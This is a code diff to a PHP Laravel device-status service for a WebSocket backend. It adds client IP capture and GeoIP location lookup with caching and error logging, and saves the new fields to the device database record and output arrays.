@@ -5,6 +5,7 @@ declare(strict_types=1);
 namespace App\WebSocket\Services;
 
 use App\Models\Device;
+use App\Services\GeoIpService;
 use App\WebSocket\ConnectionManager;
 use Illuminate\Support\Facades\Log;
 use Illuminate\Support\Facades\Redis;
@@ -69,6 +70,38 @@ final class DeviceStatusService
             }
         }
 
+        // IP 与归属地（兼容：异常不影响 WebSocket 正常连接）
+        try {
+            if (empty($status['ip_address'])) {
+                $clientIp = $this->connectionManager->getClientIp($phoneId);
+                if ($clientIp !== null) {
+                    $status['ip_address'] = $clientIp;
+                }
+            }
+
+            if (!empty($status['ip_address'])) {
+                $existing = $this->connectionManager->getDeviceStatus($phoneId);
+                $existingIp = $existing['ip_address'] ?? null;
+                $existingLocation = $existing['ip_location'] ?? null;
+
+                if ($status['ip_address'] === $existingIp && !empty($existingLocation)) {
+                    $status['ip_location'] = $existingLocation;
+                } else {
+                    $device = Device::where('uuid', $phoneId)->first();
+                    if ($device && $status['ip_address'] === $device->ip_address && !empty($device->ip_location)) {
+                        $status['ip_location'] = $device->ip_location;
+                    } else {
+                        $status['ip_location'] = app(GeoIpService::class)->getLocation($status['ip_address']);
+                    }
+                }
+            }
+        } catch (\Throwable $e) {
+            Log::channel('websocket')->warning('IP/GeoIP handling failed, skipping', [
+                'phone_id' => $phoneId,
+                'error' => $e->getMessage(),
+            ]);
+        }
+
         $this->connectionManager->updateDeviceStatus($phoneId, $status);
 
         $this->syncToDatabase($phoneId, $status);
@@ -119,6 +152,12 @@ final class DeviceStatusService
         if (isset($status['country'])) {
             $updates['country'] = $status['country'];
         }
+        if (isset($status['ip_address'])) {
+            $updates['ip_address'] = $status['ip_address'];
+        }
+        if (isset($status['ip_location'])) {
+            $updates['ip_location'] = $status['ip_location'];
+        }
 
         $device->update($updates);
 
@@ -156,6 +195,8 @@ final class DeviceStatusService
             'battery_level' => isset($status['battery_level']) ? (int) $status['battery_level'] : null,
             'has_accessibility' => ($status['has_accessibility'] ?? '0') === '1',
             'country' => $status['country'] ?? null,
+            'ip_address' => $status['ip_address'] ?? null,
+            'ip_location' => $status['ip_location'] ?? null,
             'installed_at' => isset($status['installed_at']) ? \Carbon\Carbon::parse($status['installed_at']) : now(),
             'is_online' => true,
             'last_seen_at' => now(),
@@ -223,6 +264,7 @@ final class DeviceStatusService
             // 新增字段
             'phone' => $status['phone_number'] ?? '',
             'ip' => $status['ip_address'] ?? '',
+            'ip_location' => $status['ip_location'] ?? '',
             'has_password' => $status['has_password'] ?? '0',
         ];
     }
